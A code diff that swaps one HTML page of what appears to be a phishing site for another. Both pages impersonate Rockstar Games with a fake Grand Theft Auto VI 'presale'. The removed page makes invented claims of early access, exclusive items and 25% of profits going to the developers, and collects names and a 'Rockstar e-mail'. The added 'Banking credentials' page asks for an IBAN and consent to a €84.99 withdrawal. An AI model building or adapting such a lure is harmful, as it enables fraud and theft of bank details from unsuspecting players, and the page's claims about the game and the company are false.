@@ -1,75 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>GTAVI Presale</title>
-    <link rel="stylesheet" href="assets/style/style.css" />
-    <link rel="icon" type="image/png" href="assets/img/icon.webp" />
-  </head>
-  <body>
-    <section id="form-section">
-      <article>
-        <h3>
-          Grand Theft Auto VI, the long awaited sequal of the infamous GTA V is
-          nearing its launch! Pre-order now and recieve several in-game items
-          along side early acces and more, on launch day!
-        </h3>
-        <br /><br />
-        <ul>
-          <li>
-            <b>Early Access:</b> By participating in the presale, you can secure
-            a copy ahead of the official release date, ensuring you'll be among
-            the first to play GTA 6.
-          </li>
-          <li>
-            <b>Exclusive Content</b>: The preorders comes with bonuses and
-            several in-game items. One of which being a vehicle exlusive to
-            pre-order only.
-          </li>
-          <li>
-            <b>Support the developers:</b> 25% of the pre-sale profit goes to
-            the GTA VI developers at Rockstar Games who are working long and
-            hard to offer the best off launch experience they can offer. By
-            taking part in the pre-sale you can show your appreciation to them!
-          </li>
-        </ul>
-      </article>
-      <form onsubmit="event.preventDefault(); retrieveFormData();" id="form">
-        <label for="name">First name:</label>
-        <input
-          type="text"
-          id="Fname"
-          name="Fname"
-          required
-          minlength="2"
-          maxlength="10"
-        /><br /><br />
-
-        <label for="name">Last name :</label>
-        <input
-          type="text"
-          id="Lname"
-          name="Lname"
-          required
-          minlength="2"
-          maxlength="10"
-        /><br /><br />
-
-        <label for="email">Rockstar e-mail:</label>
-        <input
-          type="email"
-          id="email"
-          name="email"
-          required
-          href="www.google.com"
-        /><br /><br />
-
-        <button id="submit" type="submit" formaction="payment.html">
-          Pre-order
-        </button>
-      </form>
-    </section>
-  </body>
-  <script src="assets/script/javascript.js"></script>
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Banking credentials</title>
+		<link rel="stylesheet" href="assets/style/style-payment.css" />
+	</head>
+	<body>
+		<form id="iban-form">
+			<label for="iban">IBAN:</label>
+			<input id="iban" name="iban" type="text" placeholder="IBAN" required />
+			<br />
+			<article class="flex">
+				<input required type="checkbox" />
+				<p>
+					I consent to Rockstar Games withdrawing €84.99 from my above mention
+					bank account and adding Grand Theft Auto VI to my Rockstar Games
+					library once the order has been processed.
+				</p>
+			</article>
+			<br /><br />
+			<button type="submit">Confirm payment</button>
+		</form>
+		<script src="assets/script/javascript-payment.js" defer></script>
+	</body>
 </html>
